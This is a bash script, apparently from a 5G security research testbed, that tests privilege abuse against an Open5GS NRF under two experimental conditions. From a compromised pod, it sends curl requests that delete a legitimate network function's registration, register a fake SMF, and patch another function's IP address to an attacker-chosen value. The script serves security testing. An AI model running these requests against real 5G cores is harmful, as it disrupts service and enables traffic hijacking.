#!/bin/bash
# run_a2pp_role_abuse.sh
# Vector A2'' -- Abuso de privilegios con identidad legitima.
# Pod nf-compromised-legit (CON label cib46-nf-type=core-nf, pero SIN
# rol scp) ejecuta operaciones de escritura sobre el NRF. Valida HE3
# (C2 vs C3).
#
# Ejecutar desde el nodo master.

set -uo pipefail

CONDICION="${1:?Uso: run_a2pp_role_abuse.sh <C2|C3>}"
TARGET_UUID="${TARGET_UUID:?Definir TARGET_UUID con el nfInstanceId de una NF legitima}"
POD=nf-compromised-legit
NRF_SVC=open5gs-cp-nrf-sbi.5g-cp.svc.cluster.local
LOG="a2pp_${CONDICION}.txt"

echo "=== A2'' -- Condicion: ${CONDICION} | $(date -u) ===" | tee "$LOG"

echo "--- READ (siempre permitido, ambas condiciones) ---" | tee -a "$LOG"
kubectl exec -n 5g-cp "$POD" -- sh -c "
curl -s --max-time 5 --http2-prior-knowledge \
  http://${NRF_SVC}:7777/nnrf-nfm/v1/nf-instances \
  -o /dev/null -w 'HTTP %{http_code}\n'" | tee -a "$LOG"

echo "--- DELETE (abuso -- borrar NF ajena) ---" | tee -a "$LOG"
kubectl exec -n 5g-cp "$POD" -- sh -c "
curl -s --max-time 5 --http2-prior-knowledge -X DELETE \
  http://${NRF_SVC}:7777/nnrf-nfm/v1/nf-instances/${TARGET_UUID} \
  -o /dev/null -w 'HTTP %{http_code}\n'" | tee -a "$LOG"

echo "--- PUT (abuso -- registrar NF falsa) ---" | tee -a "$LOG"
kubectl exec -n 5g-cp "$POD" -- sh -c "
curl -s --max-time 5 --http2-prior-knowledge -X PUT \
  http://${NRF_SVC}:7777/nnrf-nfm/v1/nf-instances/ffffffff-abus-e000-0000-000000000001 \
  -H 'Content-Type: application/json' \
  -d '{\"nfInstanceId\":\"ffffffff-abus-e000-0000-000000000001\",\"nfType\":\"SMF\",\"nfStatus\":\"REGISTERED\"}' \
  -o /dev/null -w 'HTTP %{http_code}\n'" | tee -a "$LOG"

echo "--- PATCH (abuso -- modificar NF ajena) ---" | tee -a "$LOG"
kubectl exec -n 5g-cp "$POD" -- sh -c "
curl -s --max-time 5 --http2-prior-knowledge -X PATCH \
  http://${NRF_SVC}:7777/nnrf-nfm/v1/nf-instances/${TARGET_UUID} \
  -H 'Content-Type: application/json-patch+json' \
  -d '[{\"op\":\"replace\",\"path\":\"/ipv4Addresses/0\",\"value\":\"10.244.88.88\"}]' \
  -o /dev/null -w 'HTTP %{http_code}\n'" | tee -a "$LOG"

echo "Timestamp cierre A2'' ${CONDICION}: $(date -u)" | tee -a "$LOG"
